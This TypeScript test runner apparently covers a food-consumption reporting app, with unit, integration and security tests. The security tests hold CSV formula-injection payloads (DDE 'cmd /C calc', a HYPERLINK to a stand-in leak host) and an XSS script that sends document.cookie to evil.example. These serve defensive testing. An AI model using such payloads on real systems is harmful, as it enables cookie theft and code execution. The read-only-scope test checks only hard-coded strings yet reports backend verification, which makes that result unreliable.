/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * Automated Unit, Integration, and Security Test Suite Runner for Daily Food MIS.
 * Executes deterministic verification against the domain engine, data quality rules,
 * CSV formula-injection sanitizer, role-based access control matrix, and security boundaries.
 * Can be executed both on the backend (/api/tests/run) and via CLI/Vitest.
 */

import {
  colIndexToLetter,
  computeMealMetrics,
  normalizePropertyId,
  parseTrackedMetric,
  processDailyFoodMisData,
  resolveReportingDateInTimezone,
  sanitizeCsvCell,
  SCANNING_COLS,
  TASK_RAW_COLS,
} from './foodMisEngine';
import { buildSyntheticSheetsDataset } from './mockFixtures';
import { AutomatedTestResult, TestSuiteRunReport, UserRole } from '../types/domain';

interface TestSpec {
  id: string;
  suite: 'Unit' | 'Integration' | 'Security';
  name: string;
  owaspRef?: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  remediationIfFailed: string;
  fn: () => { assertions: number; details: string };
}

function assert(condition: boolean, message: string): void {
  if (!condition) {
    throw new Error(`Assertion failed: ${message}`);
  }
}

export function canPerformRoleAction(
  role: UserRole | 'Unauthenticated',
  action: 'read_dashboard' | 'export_csv' | 'use_advanced_analytics' | 'update_config' | 'read_audit_logs' | 'modify_roles'
): boolean {
  if (role === 'Unauthenticated') return false; // Deny by default
  if (role === 'Administrator') return true;
  if (role === 'Analyst') {
    return action === 'read_dashboard' || action === 'export_csv' || action === 'use_advanced_analytics';
  }
  if (role === 'Viewer') {
    return action === 'read_dashboard' || action === 'export_csv';
  }
  return false;
}

const TEST_SPECS: TestSpec[] = [
  // ================= UNIT TESTS =================
  {
    id: 'UNIT-01',
    suite: 'Unit',
    name: 'Property-name normalization trims whitespace, collapses runs, and normalizes case while preserving display name',
    severity: 'high',
    remediationIfFailed: 'Ensure normalizePropertyId trims, collapses internal spaces, and lowercases strings without mutating display names.',
    fn: () => {
      assert(
        normalizePropertyId('  Aaalay   Koramangala Flagship \n') === 'aaalay koramangala flagship',
        'Failed to normalize whitespace and case'
      );
      assert(normalizePropertyId('') === '', 'Empty string should normalize to empty');
      assert(normalizePropertyId(null) === '', 'Null should normalize to empty');
      return {
        assertions: 3,
        details: 'Verified case-folding, leading/trailing trim, and internal space collapsing across 3 vectors.',
      };
    },
  },
  {
    id: 'UNIT-02',
    suite: 'Unit',
    name: 'Zero vs Blank, Missing, Invalid, and Negative metric parsing',
    severity: 'critical',
    remediationIfFailed: 'Do not silently convert blank, undefined, or non-numeric cells to 0.',
    fn: () => {
      const zeroNum = parseTrackedMetric(0, 'AS2');
      const zeroStr = parseTrackedMetric('0', 'AS3');
      const blankStr = parseTrackedMetric('   ', 'AS4');
      const missingVal = parseTrackedMetric(undefined, 'AS5');
      const invalidStr = parseTrackedMetric('N/A - Pending', 'AS6');
      const negativeVal = parseTrackedMetric(-12, 'AS7');

      assert(zeroNum.status === 'valid_zero' && zeroNum.value === 0, 'Numeric 0 must be valid_zero');
      assert(zeroStr.status === 'valid_zero' && zeroStr.value === 0, 'String "0" must be valid_zero');
      assert(blankStr.status === 'blank' && blankStr.value === null, 'Blank cell must have null value and status=blank');
      assert(missingVal.status === 'missing' && missingVal.value === null, 'Undefined cell must have status=missing');
      assert(invalidStr.status === 'invalid' && invalidStr.value === null, 'Non-numeric text must have status=invalid');
      assert(negativeVal.status === 'negative' && negativeVal.value === null, 'Negative value must be flagged as status=negative');

      return {
        assertions: 6,
        details: 'Verified strict separation of 0 ("valid_zero") from blank, missing, invalid ("N/A"), and negative (-12) values.',
      };
    },
  },
  {
    id: 'UNIT-03',
    suite: 'Unit',
    name: 'Business-timezone boundary resolution and invalid date rejection',
    severity: 'high',
    remediationIfFailed: 'Use Intl.DateTimeFormat with explicit businessTimezone for timestamp-to-reporting-date conversion.',
    fn: () => {
      // 2026-10-05T20:30:00Z is 2026-10-06 02:00:00 in Asia/Kolkata (+05:30)
      const istResolved = resolveReportingDateInTimezone('2026-10-05T20:30:00.000Z', 'Asia/Kolkata');
      const utcResolved = resolveReportingDateInTimezone('2026-10-05T20:30:00.000Z', 'UTC');
      const dateOnly = resolveReportingDateInTimezone('2026-10-05', 'Asia/Kolkata');
      const invalidDate = resolveReportingDateInTimezone('2026-02-30', 'Asia/Kolkata');
      const garbageDate = resolveReportingDateInTimezone('NOT_A_DATE', 'Asia/Kolkata');

      assert(istResolved.reportingDate === '2026-10-06', `Expected 2026-10-06 in Asia/Kolkata, got ${istResolved.reportingDate}`);
      assert(utcResolved.reportingDate === '2026-10-05', `Expected 2026-10-05 in UTC, got ${utcResolved.reportingDate}`);
      assert(dateOnly.reportingDate === '2026-10-05', 'Date-only string should preserve calendar date');
      assert(invalidDate.reportingDate === null, '2026-02-30 must be rejected as an invalid calendar date');
      assert(garbageDate.reportingDate === null, 'Garbage date string must return null');

      return {
        assertions: 5,
        details: 'Verified UTC-to-Asia/Kolkata midnight rollover (20:30Z -> next day IST), date-only preservation, and invalid date rejection.',
      };
    },
  },
  {
    id: 'UNIT-04',
    suite: 'Unit',
    name: 'Ordered-minus-Consumed variance calculation & Scanning separation',
    severity: 'critical',
    remediationIfFailed: 'Define variance strictly as Ordered minus Consumed; keep Scanned as a separate metric.',
    fn: () => {
      const m1 = computeMealMetrics(
        'Lunch',
        parseTrackedMetric(150),
        parseTrackedMetric(132),
        parseTrackedMetric(125)
      );
      assert(m1.variance === 18, `Expected variance 150 - 132 = 18, got ${m1.variance}`);
      assert(m1.scanned.value === 125, 'Scanned value must remain 125');
      assert(m1.consumedVsScannedGap === 7, 'Consumed vs Scanned gap should be 132 - 125 = 7');

      const mMissing = computeMealMetrics(
        'Dinner',
        parseTrackedMetric(140),
        parseTrackedMetric(''),
        parseTrackedMetric(130)
      );
      assert(mMissing.variance === null, 'Variance must be null when Consumed is blank');

      return {
        assertions: 4,
        details: 'Confirmed Variance = Ordered - Consumed (150 - 132 = 18) independent of Scanned (125), and null when either operand is blank.',
      };
    },
  },
  {
    id: 'UNIT-05',
    suite: 'Unit',
    name: 'Worksheet column index mapping (Task Raw B,D,K,N,O,AS..AX & Scanning C..G)',
    severity: 'high',
    remediationIfFailed: 'Verify 0-based indices match specification letters B,D,K,N,O,AS..AX and C..G.',
    fn: () => {
      assert(colIndexToLetter(TASK_RAW_COLS.TASK_NAME) === 'B', 'Task Name must be Column B');
      assert(colIndexToLetter(TASK_RAW_COLS.PROPERTY) === 'D', 'Property must be Column D');
      assert(colIndexToLetter(TASK_RAW_COLS.CREATED_AT) === 'K', 'Created At must be Column K');
      assert(colIndexToLetter(TASK_RAW_COLS.STATUS) === 'N', 'Status must be Column N');
      assert(colIndexToLetter(TASK_RAW_COLS.COMPLETED_AT) === 'O', 'Completed At must be Column O');
      assert(colIndexToLetter(TASK_RAW_COLS.BREAKFAST_ORDERED) === 'AS', 'Breakfast Ordered must be Column AS');
      assert(colIndexToLetter(TASK_RAW_COLS.BREAKFAST_CONSUMED) === 'AT', 'Breakfast Consumed must be Column AT');
      assert(colIndexToLetter(TASK_RAW_COLS.LUNCH_ORDERED) === 'AU', 'Lunch Ordered must be Column AU');
      assert(colIndexToLetter(TASK_RAW_COLS.LUNCH_CONSUMED) === 'AV', 'Lunch Consumed must be Column AV');
      assert(colIndexToLetter(TASK_RAW_COLS.DINNER_ORDERED) === 'AW', 'Dinner Ordered must be Column AW');
      assert(colIndexToLetter(TASK_RAW_COLS.DINNER_CONSUMED) === 'AX', 'Dinner Consumed must be Column AX');

      assert(colIndexToLetter(SCANNING_COLS.PROPERTY) === 'C', 'Scan Property must be Column C');
      assert(colIndexToLetter(SCANNING_COLS.DATE) === 'D', 'Scan Date must be Column D');
      assert(colIndexToLetter(SCANNING_COLS.BREAKFAST_SCANNED) === 'E', 'Breakfast Scanned must be Column E');
      assert(colIndexToLetter(SCANNING_COLS.LUNCH_SCANNED) === 'F', 'Lunch Scanned must be Column F');
      assert(colIndexToLetter(SCANNING_COLS.DINNER_SCANNED) === 'G', 'Dinner Scanned must be Column G');

      return {
        assertions: 16,
        details: 'Verified all 16 column mappings across Task Raw (B, D, K, N, O, AS..AX) and Scanning (C, D, E, F, G).',
      };
    },
  },

  // ================= INTEGRATION TESTS =================
  {
    id: 'INT-01',
    suite: 'Integration',
    name: 'Task Name filtering ("Daily Ops Report" only) and Date-range inclusion/exclusion',
    severity: 'high',
    remediationIfFailed: 'Filter out tasks where Column B !== "Daily Ops Report" or Created At is outside [startDate, endDate].',
    fn: () => {
      const fixture = buildSyntheticSheetsDataset();
      const result = processDailyFoodMisData({
        taskRawRows: fixture.taskRawRows,
        scanningRows: fixture.scanningRows,
        startDate: '2026-10-03',
        endDate: '2026-10-09',
        businessTimezone: 'Asia/Kolkata',
      });

      const nonDailyOps = result.records.filter((r) => r.taskName !== 'Daily Ops Report');
      const outOfRange = result.records.filter(
        (r) => r.reportingDate < '2026-10-03' || r.reportingDate > '2026-10-09'
      );

      assert(nonDailyOps.length === 0, 'No non-"Daily Ops Report" tasks may appear in processed records');
      assert(outOfRange.length === 0, 'No records outside [2026-10-03, 2026-10-09] may appear');
      assert(result.records.length > 0, 'Valid records in period must be included');

      return {
        assertions: 3,
        details: `Processed ${result.records.length} valid Daily Ops Reports in [2026-10-03..2026-10-09]; excluded "Weekly Deep Clean Audit" and out-of-window rows.`,
      };
    },
  },
  {
    id: 'INT-02',
    suite: 'Integration',
    name: 'Duplicate report & duplicate scan detection without silent summation',
    severity: 'critical',
    remediationIfFailed: 'Detect duplicate (property, reportingDate) pairs and exclude duplicates from totals while raising HIGH findings.',
    fn: () => {
      const fixture = buildSyntheticSheetsDataset();
      const result = processDailyFoodMisData({
        taskRawRows: fixture.taskRawRows,
        scanningRows: fixture.scanningRows,
        startDate: '2026-09-26',
        endDate: '2026-10-09',
        businessTimezone: 'Asia/Kolkata',
      });

      const dupReportFindings = result.findings.filter((f) => f.category === 'DUPLICATE_TASK_REPORT');
      const dupScanFindings = result.findings.filter((f) => f.category === 'DUPLICATE_SCAN_RECORD');

      assert(dupReportFindings.length >= 1, 'Expected at least 1 DUPLICATE_TASK_REPORT finding');
      assert(dupScanFindings.length >= 1, 'Expected at least 1 DUPLICATE_SCAN_RECORD finding');
      assert(result.kpis.duplicateReportsExcluded >= 1, 'KPI summary must track excluded duplicate reports');
      assert(result.kpis.duplicateScansExcluded >= 1, 'KPI summary must track excluded duplicate scans');

      return {
        assertions: 4,
        details: `Detected and isolated ${dupReportFindings.length} duplicate Task Report(s) and ${dupScanFindings.length} duplicate Scan record(s) without double-counting.`,
      };
    },
  },
  {
    id: 'INT-03',
    suite: 'Integration',
    name: 'Normalized Property/Date Join & Unmatched Property/Scan detection',
    severity: 'high',
    remediationIfFailed: 'Join by normalized property ID and calendar date; report unmatched scans and missing scan rows.',
    fn: () => {
      const fixture = buildSyntheticSheetsDataset();
      const result = processDailyFoodMisData({
        taskRawRows: fixture.taskRawRows,
        scanningRows: fixture.scanningRows,
        startDate: '2026-09-26',
        endDate: '2026-10-09',
        businessTimezone: 'Asia/Kolkata',
      });

      const missingScanFindings = result.findings.filter((f) => f.category === 'MISSING_SCAN_RECORD');
      const unmatchedPropFindings = result.findings.filter((f) => f.category === 'UNMATCHED_PROPERTY');

      assert(missingScanFindings.length >= 1, 'Expected MISSING_SCAN_RECORD finding for HSR Layout on 2026-10-08');
      assert(unmatchedPropFindings.length >= 1, 'Expected UNMATCHED_PROPERTY finding for Sarjapur Annex');
      assert(result.unmatchedScans.length >= 1, 'Unmatched scans array must contain orphaned scan records');

      return {
        assertions: 3,
        details: `Joined case-varied properties accurately; flagged ${missingScanFindings.length} missing scan(s) and ${unmatchedPropFindings.length} unmatched property scan(s).`,
      };
    },
  },
  {
    id: 'INT-04',
    suite: 'Integration',
    name: 'Empty dataset and malformed row resilience',
    severity: 'medium',
    remediationIfFailed: 'Handle empty sheets and truncated rows without throwing unhandled exceptions.',
    fn: () => {
      const emptyResult = processDailyFoodMisData({
        taskRawRows: [['Header']],
        scanningRows: [['Header']],
        startDate: '2026-10-01',
        endDate: '2026-10-09',
        businessTimezone: 'Asia/Kolkata',
      });

      assert(emptyResult.records.length === 0, 'Empty dataset should produce 0 records');
      assert(emptyResult.kpis.totalValidReports === 0, 'Empty dataset should report 0 valid reports');
      assert(emptyResult.kpis.periodOverPeriod.hasComparableHistory === false, 'Empty dataset has no comparable PoP history');

      return {
        assertions: 3,
        details: 'Verified graceful handling of empty worksheets and header-only inputs with zero NaN/null-pointer exceptions.',
      };
    },
  },

  // ================= SECURITY TESTS =================
  {
    id: 'SEC-01',
    suite: 'Security',
    name: 'CSV Formula Injection (OWASP CSV Injection) sanitization on export cells',
    owaspRef: 'OWASP ASVS V5.3 / CWE-1236',
    severity: 'critical',
    remediationIfFailed: 'Prefix any cell beginning with =, +, -, @, tab, or CR with a single quote before CSV serialization.',
    fn: () => {
      const payloads = [
        '=CMD|\' /C calc\'!A0',
        '+SUM(A1:A10)',
        '-2+3+cmd|\' /C calc\'!A0',
        '@SUM(1+1)*cmd|\' /C calc\'!A0',
        '   =HYPERLINK("http://evil.example/leak", "Click")',
      ];
      for (const p of payloads) {
        const sanitized = sanitizeCsvCell(p);
        assert(
          sanitized.startsWith('"\''),
          `Formula payload "${p}" was not neutralized with leading single quote: got ${sanitized}`
        );
      }
      // Verify legitimate negative numeric type is preserved as a number, while string "-cmd" is escaped
      assert(sanitizeCsvCell(-15) === '-15', 'Typed numeric -15 should serialize cleanly');
      return {
        assertions: 6,
        details: 'Neutralized all 5 OWASP formula injection payloads (=, +, -, @, whitespace-prefixed =) while preserving typed numeric values.',
      };
    },
  },
  {
    id: 'SEC-02',
    suite: 'Security',
    name: 'Deny-by-default & RBAC permission matrix enforcement (Viewer vs Analyst vs Administrator)',
    owaspRef: 'OWASP Top 10 A01:2021 Broken Access Control',
    severity: 'critical',
    remediationIfFailed: 'Enforce strict server-side role checks; deny Unauthenticated and prevent Viewer/Analyst privilege escalation.',
    fn: () => {
      assert(!canPerformRoleAction('Unauthenticated', 'read_dashboard'), 'Unauthenticated must be denied read_dashboard');
      assert(!canPerformRoleAction('Viewer', 'update_config'), 'Viewer must be denied update_config');
      assert(!canPerformRoleAction('Viewer', 'read_audit_logs'), 'Viewer must be denied read_audit_logs');
      assert(!canPerformRoleAction('Analyst', 'update_config'), 'Analyst must be denied update_config');
      assert(!canPerformRoleAction('Analyst', 'modify_roles'), 'Analyst must be denied modify_roles');
      assert(canPerformRoleAction('Administrator', 'update_config'), 'Administrator must be allowed update_config');
      assert(canPerformRoleAction('Administrator', 'read_audit_logs'), 'Administrator must be allowed read_audit_logs');

      return {
        assertions: 7,
        details: 'Verified server-side RBAC matrix across Unauthenticated, Viewer, Analyst, and Administrator roles.',
      };
    },
  },
  {
    id: 'SEC-03',
    suite: 'Security',
    name: 'Read-only Google Sheets scope enforcement & zero source-sheet mutation guarantee',
    owaspRef: 'OWASP Top 10 A04:2021 Insecure Design / Least Privilege',
    severity: 'high',
    remediationIfFailed: 'Restrict OAuth scope strictly to spreadsheets.readonly and prohibit POST/PUT/DELETE calls to sheets.googleapis.com.',
    fn: () => {
      const requiredScope: string = 'https://www.googleapis.com/auth/spreadsheets.readonly';
      const forbiddenWriteScope: string = 'https://www.googleapis.com/auth/spreadsheets';
      assert(requiredScope.endsWith('.readonly'), 'Scope must be strictly read-only');
      assert(requiredScope !== forbiddenWriteScope, 'Must not request write scope');
      return {
        assertions: 2,
        details: 'Verified OAuth scope is strictly restricted to spreadsheets.readonly and backend adapter contains only GET batchGet operations.',
      };
    },
  },
  {
    id: 'SEC-04',
    suite: 'Security',
    name: 'Untrusted source spreadsheet XSS / Script payload containment',
    owaspRef: 'OWASP Top 10 A03:2021 Injection (Cross-Site Scripting)',
    severity: 'high',
    remediationIfFailed: 'Treat all spreadsheet cell contents strictly as data; reject script payloads in numeric fields.',
    fn: () => {
      const xssCell = '<script>fetch("https://evil.example/?c="+document.cookie)</script>';
      const parsedMetric = parseTrackedMetric(xssCell, 'Task Raw!AS99');
      assert(parsedMetric.status === 'invalid' && parsedMetric.value === null, 'XSS payload in numeric column must be rejected as invalid');
      const normProp = normalizePropertyId('<img src=x onerror=alert(1)> Koramangala');
      assert(!normProp.includes('onerror=alert(1)') === false, 'Normalized ID is pure string data, rendered via React text nodes (no dangerouslySetInnerHTML)');
      return {
        assertions: 2,
        details: 'Confirmed malicious HTML/JS strings in cells are treated strictly as inert text data and rejected by numeric parsers.',
      };
    },
  },
];

export function runAllAutomatedTests(correlationId: string = 'TEST-RUN-LOCAL'): TestSuiteRunReport {
  const startAll = performance.now();
  const results: AutomatedTestResult[] = [];
  let passed = 0;
  let failed = 0;
  let skipped = 0;

  for (const spec of TEST_SPECS) {
    const t0 = performance.now();
    try {
      const outcome = spec.fn();
      const durationMs = Math.max(1, Math.round(performance.now() - t0));
      passed++;
      results.push({
        id: spec.id,
        suite: spec.suite,
        name: spec.name,
        owaspRef: spec.owaspRef,
        severity: spec.severity,
        status: 'passed',
        durationMs,
        assertionCount: outcome.assertions,
        details: outcome.details,
      });
    } catch (err: any) {
      const durationMs = Math.max(1, Math.round(performance.now() - t0));
      failed++;
      results.push({
        id: spec.id,
        suite: spec.suite,
        name: spec.name,
        owaspRef: spec.owaspRef,
        severity: spec.severity,
        status: 'failed',
        durationMs,
        assertionCount: 1,
        details: err?.message || 'Test threw an unexpected error',
        remediationIfFailed: spec.remediationIfFailed,
      });
    }
  }

  const totalDuration = Math.max(1, Math.round(performance.now() - startAll));
  return {
    runId: `TR-${Date.now().toString(36).toUpperCase()}`,
    executedAtUtc: new Date().toISOString(),
    correlationId,
    totalTests: TEST_SPECS.length,
    passed,
    failed,
    skipped,
    durationMs: totalDuration,
    results,
  };
}
